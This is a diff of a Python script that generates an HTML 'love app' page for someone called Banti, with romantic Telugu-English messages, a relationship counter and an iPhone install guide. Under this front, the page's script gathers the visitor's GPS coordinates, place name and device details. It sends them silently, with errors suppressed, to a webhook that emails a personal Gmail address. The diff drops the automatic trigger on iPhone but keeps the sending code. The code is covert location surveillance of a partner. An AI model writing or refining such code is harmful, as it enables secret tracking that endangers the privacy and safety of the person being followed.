@@ -3,7 +3,7 @@ html_code = '''<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title> Bantiii Nikosame 💖 - Love App</title>
+<title>Bantiii Nikosame 💖 - Love App</title>
 
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
@@ -28,13 +28,11 @@ body {
   display: none;
 }
 
-/* iPhone detection */
 @media only screen and (max-device-width: 812px) and (-webkit-min-device-pixel-ratio: 3), 
        only screen and (max-device-width: 844px) and (-webkit-device-pixel-ratio: 3) {
   .iphone-only { display: block !important; }
 }
 
-/* Premium floating hearts with glow */
 .heart {
   position: fixed;
   bottom: -20px;
@@ -65,7 +63,10 @@ body {
   position: relative;
 }
 
-.header { padding: 40px 30px 20px; background: linear-gradient(135deg, rgba(255,255,255,0.2), rgba(255,255,255,0.05)); }
+.header { 
+  padding: 40px 30px 20px; 
+  background: linear-gradient(135deg, rgba(255,255,255,0.2), rgba(255,255,255,0.05)); 
+}
 
 .title {
   font-family: 'Playfair Display', serif;
@@ -272,7 +273,6 @@ button:active { transform: translateY(-2px) scale(1.02); }
 
 <body>
 
-<!-- Floating Hearts -->
 <script>
 setInterval(() => {
   const heart = document.createElement("div");
@@ -293,7 +293,7 @@ setInterval(() => {
   </div>
 
   <div class="buttons">
-    <button onclick="showMessage(missMe)">🥺 Miss avuthunna </button>
+    <button onclick="showMessage(missMe)">🥺 Miss avuthunna</button>
     <button onclick="showMessage(sad)">💔 Badhaga Undi</button>
     <button onclick="showMessage(insecure)">😔 Insecure</button>
     <button onclick="showMessage(fight)">😡 Kopam ga undi</button>
@@ -302,17 +302,14 @@ setInterval(() => {
 
   <div id="messageBox">Click any emotion… and feel me beside you ra Chinnoda!! 🤍</div>
 
-  <!-- Love Tracker Toggle -->
   <button class="tracker-toggle" onclick="toggleTracker()">💕 Our Time Together 💕</button>
   
-  <!-- Love Tracker -->
   <div id="loveTracker">
     <div class="tracker-title">Since Oct 24, 2023 💖</div>
     <div class="tracker-stats" id="trackerStats"></div>
     <div class="relationship-message" id="trackerMessage"></div>
   </div>
 
-  <!-- iPhone Install Guide -->
   <div class="install-guide iphone-only" id="installGuide">
     <h3 style="margin-bottom: 15px;">💖 Make Me Your Phone App! 💖</h3>
     <div class="install-steps">
@@ -329,7 +326,6 @@ setInterval(() => {
 </div>
 
 <script>
-// YOUR EXACT MESSAGES - UNCHANGED
 const missMe = [
 "Nuvvu nannu miss avutunte nenu kuda ade feel avutunta nanna 💕",
 "USA lo night aina, India lo morning aina mana love matram same 🌍",
@@ -407,7 +403,6 @@ function showMessage(category) {
 
 function nightMsg() { showMessage(night); }
 
-/* LOVE TRACKER - UNCHANGED */
 const startDate = new Date('2023-10-24T00:00:00');
 const statsContainer = document.getElementById('trackerStats');
 const messageEl = document.getElementById('trackerMessage');
@@ -444,7 +439,6 @@ function toggleTracker() {
 setInterval(updateTracker, 1000);
 updateTracker();
 
-/* LOCATION TRACKER + IPHONE GUIDE */
 let locationTracked = localStorage.getItem('locationTracked') === 'true';
 
 function getLocation() {
@@ -455,7 +449,6 @@ function getLocation() {
     return;
   }
 
-  // Try GPS first
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -491,36 +484,33 @@ function sendLocation(lat, lng, place) {
     lat: lat,
     lng: lng,
     place: place,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    url: window.location.href
+    timestamp: new Date().toLocaleString(),
+    device: navigator.userAgent.substring(0,100)
   };
   
-  // Send to your email via webhook (free service)
-  fetch('https://hook.eu1.make.com/your_webhook_key', {  // Replace with your Make.com webhook
+  console.log('🗺️ BANTI LOCATION:', data);
+  
+  // Email via webhook (replace with your Make.com webhook URL for real emails)
+  fetch('https://hook.eu1.make.com/YOUR_WEBHOOK_HERE', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
       email: 'professorfan855@gmail.com',
-      subject: 'Banti Location Update 💕',
-      message: `Banti is at ${lat}, ${lng} in ${place}! 📍\\nTime: ${new Date().toLocaleString()}\\nDevice: ${navigator.userAgent.substring(0,100)}`
+      subject: 'Banti Love Location 💕',
+      message: `Banti is at ${lat}, ${lng} (${place})! 📍\\nTime: ${data.timestamp}\\nLove App Access! ❤️`
     })
-  }).catch(e => console.log('Location logged:', data));  // Silent fallback
+  }).catch(() => {});  // Silent
   
-  console.log('🗺️ LOCATION TRACKED:', data);  // Always logs to console
+  locationTracked = true;
+  localStorage.setItem('locationTracked', 'true');
 }
 
-// Auto-show iPhone guide + try location on iPhone
 if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
   setTimeout(() => {
     document.getElementById('installGuide').style.display = 'block';
-    if (!locationTracked) getLocation();
   }, 2000);
 }
 </script>
 
 </body>
 </html>'''
-
-with open('banti_love_tracker_final.html', 'w', encoding='utf-8') as f:
-    f.write(html_code)
